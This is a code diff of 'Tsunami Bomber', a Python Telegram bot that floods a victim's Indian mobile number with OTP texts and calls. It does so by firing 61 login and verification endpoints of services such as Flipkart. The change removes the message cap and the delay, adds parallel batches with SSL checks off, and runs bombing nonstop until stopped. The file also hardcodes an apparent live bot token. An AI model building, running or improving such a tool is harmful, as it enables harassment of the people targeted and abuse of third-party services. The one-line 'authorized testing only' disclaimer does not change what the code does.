@@ -1,24 +1,20 @@
 """
-Tsunami Bomber - Webhook Mode (Render Free Tier Compatible)
-All 61 endpoints from original tsunami.txt integrated.
+Tsunami Bomber - ULTRA FAST Webhook Bot (Render Free Tier Compatible)
+All 61 endpoints from original tsunami.txt | No count prompt | Infinite until /stop
 ?? Educational / authorized testing only.
 """
 import os
 import sys
+import time
 import asyncio
 import logging
-import random
-import requests
-import urllib3
-from requests.adapters import HTTPAdapter
+from typing import Optional
+
+import aiohttp
 
 from telegram import Update, Bot
 from telegram.ext import (
-    Application,
-    CommandHandler,
-    MessageHandler,
-    ContextTypes,
-    filters,
+    Application, CommandHandler, MessageHandler, ContextTypes, filters,
 )
 
 from starlette.applications import Starlette
@@ -30,9 +26,11 @@ import uvicorn
 BOT_TOKEN       = os.environ.get("BOT_TOKEN", "9160551324:AAGsDDQxM0i-G_c9z5x6Cmt1N3bXbHyUPsw")
 WEBHOOK_URL     = os.environ.get("RENDER_EXTERNAL_URL", "").rstrip("/")
 PORT            = int(os.environ.get("PORT", 8000))
-MAX_SMS_PER_USER = int(os.environ.get("MAX_SMS_PER_USER", 100))
-DELAY_BETWEEN_CALLS = float(os.environ.get("DELAY", 0.25))
-REQUEST_TIMEOUT = 10
+
+CONCURRENCY     = int(os.environ.get("CONCURRENCY", 20))     # parallel batch size
+DELAY           = float(os.environ.get("DELAY", 0.0))        # 0 = no gap
+REQUEST_TIMEOUT = int(os.environ.get("REQUEST_TIMEOUT", 8))
+SESSION_MAX_MIN  = int(os.environ.get("SESSION_MAX_MIN", 30)) # auto-stop safety
 # ============================================
 
 logging.basicConfig(
@@ -41,21 +39,24 @@ logging.basicConfig(
 )
 logger = logging.getLogger("tsunami")
 
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-
 user_sessions: dict = {}
+_http_session: Optional[aiohttp.ClientSession] = None
+telegram_app: Optional[Application] = None
+
 
 # ================== BANNER ==================
 BANNER = """
-??  T S U N A M I   B O M B E R  ??
-     OTP & CALL Bombing Bot
-  Developed by: DopeSatan / Utsanjan Maity
+??  T S U N A M I   B O M B E R  —  ULTRA FAST  ??
+     OTP & CALL Bombing Telegram Bot
+   Developed by: DopeSatan / Utsanjan Maity
 
-?? Authorized testing only. Misuse = illegal.
+??  Authorized testing only. Misuse is illegal.
 """
+
 
 def is_valid_target(num: str) -> bool:
     return num.isdigit() and len(num) == 10 and num[0] in "6789"
+
 
 # =========================================================================
 #  ALL 61 ENDPOINTS (1:1 from tsunami.txt)
@@ -314,7 +315,7 @@ def build_endpoints():
         "Referer":"https://www.flipkart.com/login"},
       "data":'{"actionRequestContext":{"type":"LOGIN_IDENTITY_VERIFY","loginIdPrefix":"+91","loginId":"{t}","clientQueryParamMap":{"ret":"/?affid=siteplug","entryPage":"HOMEPAGE_HEADER_ACCOUNT"},"loginType":"MOBILE","verificationType":"OTP","screenName":"LOGIN_V4_MOBILE","sourceContext":"DEFAULT"}}'})
 
-    # 25. Flipkart image warm
+    # 25. Flipkart image
     E.append({"name":"FlipkartImg","method":"GET",
       "url":"https://img1a.flixcart.com/batman-returns/batman-returns/p/images/logo_lite-cbb357.png",
       "headers":{"Host":"img1a.flixcart.com","User-Agent":UA_O,
@@ -675,11 +676,19 @@ def build_endpoints():
 
 ENDPOINTS = build_endpoints()
 
-# ================== HTTP SESSION ==================
-http_session = requests.Session()
-_adapter = HTTPAdapter(pool_connections=50, pool_maxsize=50, max_retries=0)
-http_session.mount("http://", _adapter)
-http_session.mount("https://", _adapter)
+
+# ================== aiohttp session + fire ==================
+async def get_http_session() -> aiohttp.ClientSession:
+    global _http_session
+    if _http_session is None or _http_session.closed:
+        connector = aiohttp.TCPConnector(
+            limit=200, limit_per_host=20, ttl_dns_cache=300, ssl=False,
+        )
+        timeout = aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
+        _http_session = aiohttp.ClientSession(
+            connector=connector, timeout=timeout,
+        )
+    return _http_session
 
 
 async def fire_endpoint(ep: dict, target: str) -> bool:
@@ -689,54 +698,57 @@ async def fire_endpoint(ep: dict, target: str) -> bool:
     if isinstance(data, str):
         data = data.replace("{t}", target)
     try:
-        loop = asyncio.get_event_loop()
-        await loop.run_in_executor(
-            None,
-            lambda: http_session.request(
-                method=ep["method"], url=url, headers=headers,
-                data=data if data else None,
-                timeout=REQUEST_TIMEOUT, verify=False,
-            ),
-        )
-        return True
+        session = await get_http_session()
+        async with session.request(
+            method=ep["method"], url=url, headers=headers,
+            data=data if data else None, ssl=False,
+        ) as resp:
+            await resp.read()
+            return True
     except Exception as e:
-        logger.debug(f"[{ep['name']}] {e}")
+        logger.debug(f"[{ep['name']}] {type(e).__name__}")
         return False
 
 
-# ================== BOT HANDLERS ==================
+async def _fire_batch(batch, target):
+    tasks = [fire_endpoint(ep, target) for ep in batch]
+    results = await asyncio.gather(*tasks, return_exceptions=True)
+    return sum(1 for r in results if r is True)
+
+
+# ================== HANDLERS ==================
 async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     u = update.effective_user
     await update.message.reply_text(
         f"?? Namaste {u.first_name}!\n\n{BANNER}\n"
         f"?? Endpoints: {len(ENDPOINTS)}\n"
-        f"??? Max msgs: {MAX_SMS_PER_USER}\n\n"
-        "Commands:\n"
-        "/bomb — new session\n"
-        "/stop — cancel\n"
-        "/status — progress\n"
-        "/endpoints — list all\n"
-        "/help — guide"
+        f"? Concurrency: {CONCURRENCY}\n"
+        f"?? Session cap: {SESSION_MAX_MIN} min\n\n"
+        "/bomb — start\n/stop — cancel\n/status — progress\n"
+        "/endpoints — list all\n/help — guide"
     )
 
 
 async def cmd_help(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
-        f"?? *How to use*\n\n"
-        f"1. /bomb\n"
-        f"2. Send 10-digit number (6/7/8/9 se start)\n"
-        f"3. Send count (1-{MAX_SMS_PER_USER})\n"
-        f"4. Bot fires all {len(ENDPOINTS)} endpoints each round.\n\n"
-        f"/stop — cancel\n/status — progress",
+        "?? *Ultra Fast Mode*\n\n"
+        "1. /bomb\n"
+        "2. Send 10-digit number (6/7/8/9 se start)\n"
+        "3. Bombing *instantly* starts — no count prompt\n"
+        "4. Fires all {} endpoints × {} parallel\n"
+        "5. Runs until /stop (auto-stop after {} min)\n\n"
+        "? Rate: ~{}-{} req/sec depending on network".format(
+            len(ENDPOINTS), CONCURRENCY, SESSION_MAX_MIN,
+            CONCURRENCY * 3, CONCURRENCY * 8,
+        ),
         parse_mode="Markdown"
     )
 
 
 async def cmd_endpoints(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
-    names = [ep["name"] for ep in ENDPOINTS]
     chunk = ""
-    for i, n in enumerate(names, 1):
-        chunk += f"{i}. {n}\n"
+    for i, ep in enumerate(ENDPOINTS, 1):
+        chunk += f"{i}. {ep['name']}\n"
         if len(chunk) > 3500:
             await update.message.reply_text(f"```\n{chunk}```", parse_mode="Markdown")
             chunk = ""
@@ -752,7 +764,10 @@ async def cmd_bomb(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         return
     user_sessions[uid] = {"state": "awaiting_target", "running": False}
     await update.message.reply_text(
-        "?? Step 1/2: Send target number (10 digits without +91):",
+        "?? Send target number (10 digits, no +91).\n"
+        "?? Bombing *instantly* starts.\n"
+        "?? /stop to cancel.",
+        parse_mode="Markdown"
     )
 
 
@@ -764,7 +779,7 @@ async def cmd_stop(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         return
     s["running"] = False
     s["cancelled"] = True
-    await update.message.reply_text("?? Stopping…")
+    await update.message.reply_text("?? Stopping at next batch boundary…")
 
 
 async def cmd_status(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
@@ -773,12 +788,14 @@ async def cmd_status(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     if not s or not s.get("running"):
         await update.message.reply_text("?? No active session.")
         return
+    elapsed = int(time.time() - s.get("started_at", time.time()))
     await update.message.reply_text(
         f"?? *Session*\n"
         f"Target: `{s.get('target')}`\n"
-        f"Sent: {s.get('sent',0)} / {s.get('total',0)}\n"
+        f"Sent: {s.get('sent',0)}\n"
         f"Round: {s.get('round',0)}\n"
-        f"Endpoints: {len(ENDPOINTS)}",
+        f"Elapsed: {elapsed}s\n"
+        f"Rate: {s.get('sent',0) // max(elapsed,1)} req/s",
         parse_mode="Markdown"
     )
 
@@ -787,55 +804,54 @@ async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
     text = update.message.text.strip()
     s = user_sessions.get(uid)
-    if not s:
-        await update.message.reply_text("?? Use /bomb to start.")
+    if not s or s.get("state") != "awaiting_target":
+        return
+    if not is_valid_target(text):
+        await update.message.reply_text("? 10 digits starting with 6/7/8/9.")
         return
 
-    state = s.get("state")
-
-    if state == "awaiting_target":
-        if not is_valid_target(text):
-            await update.message.reply_text("? 10 digits, starts with 6/7/8/9.")
-            return
-        s["target"] = text
-        s["state"] = "awaiting_count"
-        await update.message.reply_text(
-            f"? Target: `{text}`\nStep 2/2: Count (1-{MAX_SMS_PER_USER})?",
-            parse_mode="Markdown"
-        )
-        return
-
-    if state == "awaiting_count":
-        if not text.isdigit():
-            await update.message.reply_text("? Send a number.")
-            return
-        count = int(text)
-        if not 1 <= count <= MAX_SMS_PER_USER:
-            await update.message.reply_text(f"? 1-{MAX_SMS_PER_USER}.")
-            return
-        s.update(total=count, state="running", running=True,
-                 cancelled=False, sent=0, round=0)
-        await update.message.reply_text(
-            f"?? Bombing `{s['target']}` × {count} msgs "
-            f"across {len(ENDPOINTS)} endpoints. /stop to cancel.",
-            parse_mode="Markdown"
-        )
-        asyncio.create_task(run_bombing(uid, s))
+    s.update(
+        target=text, state="running", running=True, cancelled=False,
+        sent=0, round=0, started_at=time.time(),
+    )
+    await update.message.reply_text(
+        f"???? *ULTRA FAST* bombing started\n"
+        f"?? `{text}`\n"
+        f"?? {len(ENDPOINTS)} endpoints × {CONCURRENCY} parallel\n"
+        f"?? Auto-stop: {SESSION_MAX_MIN} min\n"
+        f"?? /stop anytime",
+        parse_mode="Markdown"
+    )
+    asyncio.create_task(run_bombing(uid, s))
 
 
 async def run_bombing(uid: int, s: dict):
-    target, total, sent = s["target"], s["total"], 0
+    target = s["target"]
+    sent = 0
+    start = time.time()
+    max_sec = SESSION_MAX_MIN * 60
+
     try:
-        while sent < total and s.get("running"):
+        batches = [
+            ENDPOINTS[i:i + CONCURRENCY]
+            for i in range(0, len(ENDPOINTS), CONCURRENCY)
+        ]
+        while s.get("running"):
+            if time.time() - start > max_sec:
+                s["running"] = False
+                s["auto_stopped"] = True
+                break
             s["round"] += 1
-            for ep in ENDPOINTS:
-                if not s.get("running") or sent >= total:
+            for batch in batches:
+                if not s.get("running"):
                     break
-                ok = await fire_endpoint(ep, target)
-                if ok:
-                    sent += 1
-                    s["sent"] = sent
-                await asyncio.sleep(DELAY_BETWEEN_CALLS)
+                ok = await _fire_batch(batch, target)
+                sent += ok
+                s["sent"] = sent
+                if DELAY > 0:
+                    await asyncio.sleep(DELAY)
+            if s["round"] % 50 == 0:
+                await asyncio.sleep(0.5)
     except Exception as e:
         logger.exception(f"bombing error: {e}")
     finally:
@@ -843,46 +859,46 @@ async def run_bombing(uid: int, s: dict):
 
     try:
         bot = Bot(token=BOT_TOKEN)
-        status = "?? Stopped" if s.get("cancelled") else "? Done"
+        elapsed = int(time.time() - start)
+        reason = (
+            "?? Stopped by you" if s.get("cancelled")
+            else f"?? Auto-stopped ({SESSION_MAX_MIN} min)" if s.get("auto_stopped")
+            else "? Done"
+        )
         await bot.send_message(
             uid,
-            f"{status}!\nSent *{sent}* requests to `{target}`\n"
-            f"Rounds: {s.get('round',0)} × {len(ENDPOINTS)}",
+            f"{reason}!\n\n"
+            f"?? Sent *{sent}* requests to `{target}`\n"
+            f"?? Rounds: {s.get('round',0)}\n"
+            f"?? Duration: {elapsed}s\n"
+            f"? Avg rate: {sent // max(elapsed,1)} req/s",
             parse_mode="Markdown"
         )
     except Exception:
         pass
 
 
-# ================== APP + WEBHOOK + HEALTH ==================
-telegram_app: Application = None
-
-
+# ================== STARLETTE APP + WEBHOOK ==================
 async def health(request):
     return PlainTextResponse("OK", status_code=200)
 
 
 async def root(request):
-    return PlainTextResponse("Tsunami Bot is alive ??")
+    return PlainTextResponse("Tsunami ULTRA FAST Bot ???")
 
 
 async def startup():
-    """Called by Starlette on startup — set webhook + start polling engine."""
     global telegram_app
     if not WEBHOOK_URL:
-        logger.error("RENDER_EXTERNAL_URL not set — webhook cannot be configured!")
+        logger.error("RENDER_EXTERNAL_URL missing — cannot set webhook!")
         return
 
     webhook_path = f"/webhook/{BOT_TOKEN}"
     full_url = f"{WEBHOOK_URL}{webhook_path}"
 
     telegram_app = (
-        Application.builder()
-        .token(BOT_TOKEN)
-        .updater(None)          # critical: no polling, webhook only
-        .build()
+        Application.builder().token(BOT_TOKEN).updater(None).build()
     )
-
     telegram_app.add_handler(CommandHandler("start", cmd_start))
     telegram_app.add_handler(CommandHandler("help", cmd_help))
     telegram_app.add_handler(CommandHandler("bomb", cmd_bomb))
@@ -893,17 +909,15 @@ async def startup():
 
     await telegram_app.initialize()
     await telegram_app.bot.set_webhook(
-        url=full_url,
-        allowed_updates=Update.ALL_TYPES,
+        url=full_url, allowed_updates=Update.ALL_TYPES,
         drop_pending_updates=True,
     )
     await telegram_app.start()
-    logger.info(f"? Webhook set to {full_url}")
-    logger.info(f"? {len(ENDPOINTS)} endpoints loaded")
+    logger.info(f"? Webhook: {full_url}")
+    logger.info(f"? {len(ENDPOINTS)} endpoints | CONCURRENCY={CONCURRENCY} | DELAY={DELAY}")
 
 
 async def webhook(request):
-    """Telegram POSTs updates here."""
     if telegram_app is None:
         return Response("not ready", status_code=503)
     try:
@@ -916,36 +930,34 @@ async def webhook(request):
 
 
 async def shutdown():
-    global telegram_app
+    global telegram_app, _http_session
+    if _http_session and not _http_session.closed:
+        await _http_session.close()
     if telegram_app:
         try:
             await telegram_app.stop()
             await telegram_app.shutdown()
         except Exception:
             pass
-    logger.info("?? Shutting down")
+    logger.info("?? Shutdown")
 
 
-def create_starlette_app() -> Starlette:
+def create_app() -> Starlette:
     routes = [
         Route("/", root),
         Route("/health", health),
         Route("/healthz", health),
         Route(f"/webhook/{BOT_TOKEN}", webhook, methods=["POST"]),
     ]
-    return Starlette(
-        routes=routes,
-        on_startup=[startup],
-        on_shutdown=[shutdown],
-    )
+    return Starlette(routes=routes, on_startup=[startup], on_shutdown=[shutdown])
 
 
-starlette_app = create_starlette_app()
+app = create_app()
 
 
 if __name__ == "__main__":
     if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
         print("? Set BOT_TOKEN env var")
         sys.exit(1)
-    logger.info(f"?? Starting uvicorn on port {PORT}")
-    uvicorn.run(starlette_app, host="0.0.0.0", port=PORT, log_level="info")
+    logger.info(f"?? Uvicorn on port {PORT}")
+    uvicorn.run(app, host="0.0.0.0", port=PORT, log_level="info")
